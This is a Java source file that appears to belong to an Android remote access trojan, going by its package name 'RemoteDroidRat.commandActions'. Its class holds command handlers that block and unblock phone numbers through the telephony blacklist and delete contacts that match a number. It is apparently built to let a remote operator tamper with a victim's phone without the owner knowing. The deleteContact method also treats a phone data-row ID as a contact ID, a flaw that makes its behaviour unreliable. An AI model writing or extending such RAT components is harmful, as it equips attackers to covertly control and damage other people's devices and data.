package com.KaranKumar.RemoteDroidRat.commandActions;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;

public class numberAction {

    private static final Uri BLACKLIST_URI = Uri.parse("content://telephony/blacklist");

    public static void blockNumber(Context context, String phoneNumber) {
        ContentValues values = new ContentValues();
        values.put("number", phoneNumber);
        context.getContentResolver().insert(BLACKLIST_URI, values);
    }

    public static void unblockNumber(Context context, String phoneNumber) {
        context.getContentResolver().delete(BLACKLIST_URI, "number=?", new String[]{phoneNumber});
    }

    public static void deleteContact(Context context, String phoneNumber) {
        ContentResolver resolver = context.getContentResolver();
        Cursor cursor = resolver.query(
			ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
			new String[]{ContactsContract.CommonDataKinds.Phone._ID},
			ContactsContract.CommonDataKinds.Phone.NUMBER + "=?",
			new String[]{phoneNumber},
			null
        );

        if (cursor != null && cursor.moveToFirst()) {
            long contactId = cursor.getLong(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID));
            Uri contactUri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, contactId);
            resolver.delete(contactUri, null, null);
        }

        if (cursor != null) {
            cursor.close();
        }
    }
}
